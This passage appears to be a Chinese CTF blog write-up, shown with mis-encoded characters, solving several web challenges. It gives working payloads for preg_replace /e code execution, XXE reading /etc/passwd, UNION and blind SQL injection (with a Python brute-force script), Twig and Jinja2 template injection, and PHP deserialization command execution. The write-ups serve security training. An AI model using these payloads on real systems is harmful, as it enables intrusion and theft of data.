payload:</p><pre><code>?file=php://filter/convert.base64-encode/resource=next.php&amp;text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></pre><p>è¯»å–next.phpä¸­çš„å†…å®¹ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwc0ikop9j31hc09tt96.jpg" alt=""></p><pre><code>&lt;?php$id = $_GET[&apos;id&apos;];$_SESSION[&apos;id&apos;] = $id;function complex($re, $str) {return preg_replace(&apos;/(&apos; . $re . &apos;)/ei&apos;,&apos;strtolower(&quot;\1&quot;)&apos;,$str);}foreach($_GET as $re =&gt; $str) {echo complex($re, $str). &quot;\n&quot;;}function getFlag(){    @eval($_GET[&apos;cmd&apos;]);}</code></pre><p>base64è§£ç åè·å¾—next.phpå¾—å†…å®¹ã€‚<br>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯preg_replace /eæ¨¡å¼ä¸‹å­˜åœ¨çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwdhy6onuj30r906rmxl.jpg" alt=""><br>æ‰€ä»¥ä¸èƒ½ç›´æ¥æ„é€ \S*=${system(â€˜lsâ€™)}ï¼Œå› ä¸ºä¼ å‚æ•°ä¼šè¢«æ›¿æ¢æ‰ï¼Œä½†æ˜¯getFlag()å‡½æ•°ä¸­æœ‰@eval($_GET[â€˜cmdâ€™]);å¯ä»¥ä¼ å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giwdexejulj30vs0jywfk.jpg" alt=""><br>è¯¦æƒ…è§å‚è€ƒï¼Œæ‰€ä»¥æ„é€ payload:</p><pre><code>next.php?\S*=${getFlag()}&amp;cmd=system(&quot;cat /flag&quot;);</code></pre><p>å³å¯è·å¾—flagã€‚<br>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener" title="æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ">https://xz.aliyun.com/t/2557</a></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwej7gvxsj30kk01raa6.jpg" alt=""><br>æ‰“å¼€æºç ï¼Œçœ‹åˆ°æç¤ºï¼Œè¯´utf-8å¾ˆé‡è¦ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giwekple72j30nd05sq2w.jpg" alt=""><br>è¾“å…¥çš„ä»·æ ¼æ•°å­—ä¸ºä¸¤ä½ä»¥ä¸Šä¼šæŠ¥é”™ï¼Œè¯´æ˜ä»·æ ¼åªèƒ½ä¸º0-9ï¼Œæ‰€ä»¥å‰ä¸‰ä¸ªç‹¬è§’å…½éƒ½èƒ½ä¹°ï¼Œä½†æœ€åä¸€ä¸ªç‹¬è§’å…½ä»·æ ¼å¾ˆé«˜ï¼Œå¯ä»¥çŒœæµ‹ä¹°æœ€åä¸€ä¸ªå°±æœ‰flagã€‚<br>æ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œä¸”è¿™ä¸ªå­—ç¬¦æ¯”1337å¤§æ‰è¡Œã€‚</p><p>æ‰€ä»¥è¿™é¢˜è€ƒæŸ¥çš„æ˜¯utf-8ç¼–ç çš„å®‰å…¨è½¬æ¢é—®é¢˜ã€‚</p><p><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>åœ¨è¿™ä¸ªç½‘ç«™ç›´æ¥è¾“å…¥thousandæŸ¥æ‰¾ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giweyc8nj4j310a0hfwfc.jpg" alt=""><br>åªè¦æ‰¾åˆ°ä¸€ä¸ªNumeric Valueå¤§äº1337çš„å­—ç¬¦å°±å¯ä»¥äº†ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwf1f4o6lj30ki02j746.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giwf0lhaodj30ma04h74a.jpg" alt=""><br>å°†0xæ¢æˆ%ï¼Œç„¶åä»¥ä»·æ ¼çš„æ–¹å¼è¾“å…¥ä»è€Œè·å¾—flagã€‚</p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>é¢˜ç›®ç»™å‡ºäº†XMLï¼Œæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯XMLçš„æ¼æ´ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™é¢˜è€ƒæŸ¥çš„æ˜¯XXEæ¼æ´ï¼ŒXXEæ¼æ´å…¨ç§°XML External Entity Injectionå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gix1ifiv2vj30qh0a5wfi.jpg" alt=""><br>æŠ“åŒ…å‘ç°usernameå’Œpasswordéƒ½æ˜¯xmlæ ¼å¼ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gix293mnjaj30wo0fx0v1.jpg" alt=""><br>æ„é€ payload:</p><pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p>æˆåŠŸæ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gix2aurkc8j30v70bmq48.jpg" alt=""><br>ç„¶åè¯»å–flagã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.freebuf.com/vuls/175451.html" target="_blank" rel="noopener" title="æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ ">https://www.freebuf.com/vuls/175451.html</a></p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gix36cgq2pj313g06yaai.jpg" alt=""><br>çœ‹äº†wpæ‰çŸ¥é“è¿™é¢˜æ˜¯SQLæ³¨å…¥ï¼Œè¾“å…¥å¹¿å‘Šåä¸º1â€™ï¼ŒæŸ¥çœ‹å¹¿å‘Šåæ˜¯æŠ¥é”™ï¼Œå¯è§å¹¿å‘Šåå¤„å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚<br>ç»æµ‹è¯•å‘ç°#å’Œâ€“éƒ½è¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥ä½¿ç”¨â€™å°†åé¢çš„â€™é—­åˆï¼Œä½¿ç”¨<code>/**/</code>ç»•è¿‡ç©ºæ ¼ã€‚<br>ä½¿ç”¨<code>1&#39;/**/&#39;</code>é¡µé¢æ¢å¤æ­£å¸¸ï¼Œorä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åªèƒ½æ‰‹åŠ¨æ¢æµ‹åˆ—æ•°ã€‚<br>ç»æµ‹è¯•å‘ç°ï¼Œæœ‰22åˆ—ã€‚</p><pre><code>-1&apos;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p>å› ä¸ºorè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨information_schemaåº“ã€‚<br>ä½†è¿™é¢˜å¯ä»¥åˆ©ç”¨å¦å¤–ä¸€ä¸ªæ–¹æ³•ï¼Œmysqlæ— åˆ—åæ³¨å…¥ã€‚<br>ä½†è¿™é¢˜ç”¨<code>sys.schema_auto_increment_columns</code>æ˜¾ç¤ºæ²¡æœ‰è¿™ä¸ªè¡¨ï¼Œæ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°<code>mysql.innodb_table_stats</code>å¯ä»¥ä½¿ç”¨ã€‚<br>æ„é€ payload:</p><pre><code>-1&apos;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gix76s6posj313c05jweq.jpg" alt=""><br>è·å¾—è¡¨åã€‚<br>ç”±äº`è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨åˆ«åæ¥ä»£æ›¿ã€‚<br>æ„é€ payload:</p><pre><code>-1&apos;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gix7gv77flj316u06fwex.jpg" alt=""><br>å‘ç°å°±å·²ç»å¾—åˆ°flagäº†ã€‚</p><p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener" title="CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥">https://zhuanlan.zhihu.com/p/98206699</a><br><a href="https://www.cnblogs.com/20175211lyz/p/12184867.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12184867.html</a></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><pre><code>&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&apos;c&apos;])){show_source(__FILE__);}else{//ä¾‹å­ c=20-1$content = $_GET[&apos;c&apos;];if (strlen($content) &gt;= 80) {die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);}$blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;];foreach ($blacklist as $blackitem) {if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);}}//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp$whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);  foreach ($used_funcs[0] as $func) {if (!in_array($func, $whitelist)) {die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);}}//å¸®ä½ ç®—å‡ºç­”æ¡ˆeval(&apos;echo &apos;.$content.&apos;;&apos;);} </code></pre><p>é¢˜ç›®æºç ã€‚<br>ä»£ç å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯åªèƒ½ç”¨é¢˜ç›®æ‰€ç»™çš„æ•°å­¦å‡½æ•°æ„é€ ã€‚<br>ä¸€ç§payloadæ˜¯ï¼š</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><p>è§£é‡Šï¼š</p><pre><code>base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;dechex(1598506324) =&gt; &quot;5f474554&quot;$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}(($_GET){abs})  //{}å¯ä»¥ä»£æ›¿[]</code></pre><p>å…¶ä½™æ–¹æ³•è§å‚è€ƒã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixaagz481j30xu0b9dh2.jpg" alt=""><br>å› ä¸º49=49<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br>æ‰€ä»¥è¿™é‡Œæ˜¯twig.<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gixae44dnpj30yc0a4q3x.jpg" alt=""><br>æ‰€ä»¥æ„é€ payload:</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre><p>æˆåŠŸæ‰§è¡Œï¼Œå›æ˜¾idã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gixafsp7zjj30x10af75b.jpg" alt=""><br>æœ€åæ„é€ payload:</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p>è·å¾—flag</p><p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener" title="æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»">https://zhuanlan.zhihu.com/p/28823933</a></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&apos;FLAG&apos;] = os.environ.pop(&apos;FLAG&apos;)//æ³¨å†Œä¸€ä¸ªåä¸ºFLAGçš„config,çŒœæµ‹å°±æ˜¯flagã€‚@app.route(&apos;/&apos;)def index():    return open(__file__).read()@app.route(&apos;/shrine/&lt;path:shrine&gt;&apos;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&apos;(&apos;, &apos;&apos;).replace(&apos;)&apos;, &apos;&apos;)        blacklist = [&apos;config&apos;, &apos;self&apos;]        return &apos;&apos;.join([&apos;{{% set {}=None%}}&apos;.format(c) for c in blacklist]) + s//æŠŠé»‘åå•çš„ä¸œè¥¿éå†å¹¶è®¾ä¸ºç©ºã€‚return flask.render_template_string(safe_jinja(shrine))//è¿›è¡Œæ¨¡å—æ¸²æŸ“if __name__ == &apos;__main__&apos;:    app.run(debug=True)</code></pre><p>é¢˜ç›®ç»™å‡ºäº†æºç ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giyb3he3waj30oh0kegmb.jpg" alt=""><br>ä»£ç ä¸­æœ‰jinjiaçš„å­—æ ·ï¼Œè€Œä¸”å¯¼å…¥äº†flaskæ¨¡å—ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹æ˜¯flask/jinja2æ¨¡æ¿æ³¨å…¥,ç»æµ‹è¯•æœç„¶æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ã€‚</p><p>åˆ©ç”¨tplmapè¿™ä¸ªå·¥å…·è¿›è¡Œæ£€æµ‹æ˜¯å¦æœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´</p><p>é¢˜ç›®å°†configè¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ <code>/shrine/</code>,ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚ <code>url_for</code>å’Œ  <code>get_flashed_messagesã€‚</code><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giydg9vtgej31gc0kcdmd.jpg" alt=""><br>åˆ©ç”¨ <code>/shrine/</code>çœ‹åˆ°æ‰€æœ‰appçš„configã€‚<br>è¿™é‡Œé¢æœ‰ä¸€ä¸ªcurrent_appå°±æ˜¯å½“å‰appçš„æ„æ€ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giydlam5nqj31gw0kk410.jpg" alt=""><br>flagå°±åœ¨å½“å‰appçš„configä¸­ã€‚</p><p>å¦å¤–ä¸€ç§å°±æ˜¯ç”¨<code>get_flashed_messagesã€‚</code><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giydn6p96ij31hc0kq412.jpg" alt=""><br>åŒæ ·å¯ä»¥è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giye1jyf12j30jm06wn14.jpg" alt=""><br>è¿›å»çœ‹åˆ°é¡µé¢å‡ºç°è­¦å‘Šï¼Œå¹¶ä¸”æ˜¾ç¤ºçš„æ—¶é—´ä¸€ç›´åœ¨æ”¹å˜ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giye2exny9j30h106u749.jpg" alt=""><br>æŠ“åŒ…å¯ä»¥çœ‹åˆ°postäº†ä¸¤ä¸ªå‚æ•°ï¼Œå¯ä»¥çŸ¥é“funcçš„æ˜¯å‡½æ•°ï¼Œpæ˜¯è¯¥å‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥æ˜¯è¿è¡Œä¸Šä¼ çš„å‡½æ•°ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giye53jtckj30sl08iglv.jpg" alt=""><br>å°è¯•è¿è¡Œeval(system(â€˜lsâ€™))ï¼Œå‘ç°è¢«æ£€æµ‹å‡ºæ¥äº†ã€‚è¯•ä¸€ä¸‹è¯»å–é¢˜ç›®çš„æºç ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giye8jkf9hj30yk0bemyf.jpg" alt=""><br>ä½¿ç”¨file_get_contents(index.php)è¯»å–åˆ°é¢˜ç›®çš„æºç ã€‚</p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) {    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) {        return $result;    } else {return &quot;&quot;;}}class Test {    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() {        if ($this-&gt;func != &quot;&quot;) {            echo gettime($this-&gt;func, $this-&gt;p);        }    }}$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) {    $func = strtolower($func);    if (!in_array($func,$disable_fun)) {        echo gettime($func, $p);    }else {        die(&quot;Hacker...&quot;);    }}?&gt;</code></pre><p>å³å¯çœ‹åˆ°é¢˜ç›®æºç ã€‚<br>å®¡è®¡ä»£ç å¯ä»¥æ„Ÿè§‰åˆ°æœ¬é¢˜å¾ˆåƒååºåˆ—çš„é¢˜ã€‚è€Œä¸”æœ¬é¢˜åªæ˜¯å¯¹funcè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶æ²¡æœ‰å¯¹pè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥æƒ³åˆ°æŠŠå‘½ä»¤åºåˆ—åŒ–åä¸Šä¼ ç»™pï¼Œfuncä¸Šä¼ unserializeã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyendbec7j30sh08rgm4.jpg" alt=""><br>æ„é€ payload:</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} </code></pre><p>å‘ç°æ‰§è¡ŒæˆåŠŸã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyexwwomvj30sm08owf3.jpg" alt=""><br>ç»æŸ¥æ‰¾ï¼Œåœ¨tmpå‘ç°å¸¦flagçš„æ–‡ä»¶ï¼Œæ‰€ä»¥flagåº”è¯¥åœ¨è¿™é‡Œã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giyf0bhmabj30tp08x74z.jpg" alt=""><br>ä»è€Œè·å¾—flagã€‚</p><h2 id="BJDCTF-2nd-ç®€å•æ³¨å…¥"><a href="#BJDCTF-2nd-ç®€å•æ³¨å…¥" class="headerlink" title="[BJDCTF 2nd]ç®€å•æ³¨å…¥"></a>[BJDCTF 2nd]ç®€å•æ³¨å…¥</h2><p>å‘ç°é¢˜ç›®æœ‰robots.txtæ–‡ä»¶ã€‚ç»™çš„æç¤ºæ˜¯hint.txtã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giylby5hczj30og07idg2.jpg" alt=""><br>é¢˜ç›®ç»™äº†SQLè¯­å¥çš„å½¢å¼ã€‚<br>æµ‹è¯•å‘ç°=å’Œlikeéƒ½è¢«è¿‡æ»¤äº†ã€‚å°è¯•payload:</p><pre><code>username=admin\&amp;password=1#</code></pre><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyljizphzj30by0e6wfg.jpg" alt=""></p><p>é¡µé¢å‘ç”Ÿå˜åŒ–ã€‚SQLè¯­å¥å˜ä¸º:</p><pre><code>select * from users where username=&apos;admin\&apos; and password=&apos;or 1#&apos;;</code></pre><p>å…¶ä¸­ç¬¬äºŒä¸ªâ€™è¢«\è½¬ä¹‰æ‰ï¼Œæ‰€ä»¥adminåé¢çš„â€™ä¼šè¢«è®¤ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å°†å•å¼•å·æ‹¬èµ·æ¥çš„å•å¼•å·ï¼Œæ‰€ä»¥æˆåŠŸç»•è¿‡ã€‚<br>å‚è€ƒåˆ«äººçš„äºŒåˆ†è„šæœ¬ï¼š</p><pre><code>import requestsurl = &quot;http://78fef60f-0aab-4f37-a6ad-f381989f1198.node3.buuoj.cn/index.php&quot;data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) &gt;&gt; 1    payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;stronger&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif head!=32:    result += chr(head)else:    breakprint(result)</code></pre><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giymjli9soj30c20h10tr.jpg" alt=""></p><p>æœ€åè·‘å‡ºå¯†ç ä¸ºï¼šOhyOuFOuNditï¼Œç™»å½•åè·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/h3zh1/p/12669345.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12669345.html</a></p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><pre><code>&lt;?php$function = @$_GET[&apos;f&apos;];function filter($img){$filter_arr = array(&apos;php&apos;,&apos;flag&apos;,&apos;php5&apos;,&apos;php4&apos;,&apos;fl1g&apos;);$filter = &apos;/&apos;.implode(&apos;|&apos;,$filter_arr).&apos;/i&apos;;return preg_replace($filter,&apos;&apos;,$img);}if($_SESSION){unset($_SESSION);}$_SESSION[&quot;user&quot;] = &apos;guest&apos;;$_SESSION[&apos;function&apos;] = $function;extract($_POST);if(!$function){echo &apos;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&apos;;}if(!$_GET[&apos;img_path&apos;]){$_SESSION[&apos;img&apos;] = base64_encode(&apos;guest_img.png&apos;);}else{$_SESSION[&apos;img&apos;] = sha1(base64_encode($_GET[&apos;img_path&apos;]));}$serialize_info = filter(serialize($_SESSION));if($function == &apos;highlight_file&apos;){highlight_file(&apos;index.php&apos;);}else if($function == &apos;phpinfo&apos;){eval(&apos;phpinfo();&apos;); //maybe you can find something in here!}else if($function == &apos;show_image&apos;){$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&apos;img&apos;]));}</code></pre><p>implode:å°†ä¸€ä¸ªä¸€ç»´æ•°ç»„çš„å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>unset() å‡½æ•°ç”¨äºé”€æ¯ç»™å®šçš„å˜é‡ã€‚</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giynaevdlyj30fd0cpdg8.jpg" alt=""></p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giynpqkjgvj30vd033aa0.jpg" alt=""><br>ä»£ç è¯´èƒ½åœ¨phpinfoä¸­æ‰¾åˆ°ä¸€ç‚¹ä¸œè¥¿ï¼Œæ‰€ä»¥æ‰¾äº†ä¸‹ï¼Œä¼°è®¡è¿™å°±æ˜¯flagçš„æ–‡ä»¶åã€‚æœ€åæœ‰ä¸€ä¸ªfile_get_contentså‡½æ•°ï¼Œæƒ³ç€åˆ©ç”¨è¿™ä¸ªå‡½æ•°è¯»å–d0g3_f1ag.phpï¼Œä»è¿™ä¸ªå‡½æ•°é€†æ¨å›å»$userinfo[â€œimgâ€]çš„å€¼ï¼Œå‘ç°å€¼æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯ä¼šç»è¿‡sha1åŠ å¯†ï¼Œè€Œé¢˜ç›®å¹¶æ²¡æœ‰sha1è§£å¯†ï¼Œæ‰€ä»¥å°±ä¸èƒ½è¯»å–æ–‡ä»¶ã€‚</p><p>æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯phpååºåŒ–çš„å¯¹è±¡é€ƒé€¸ã€‚</p><p>æ„é€ payload:</p><pre><code>_SESSION[phpflag]=;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizku2ihdlj30qe0hr401.jpg" 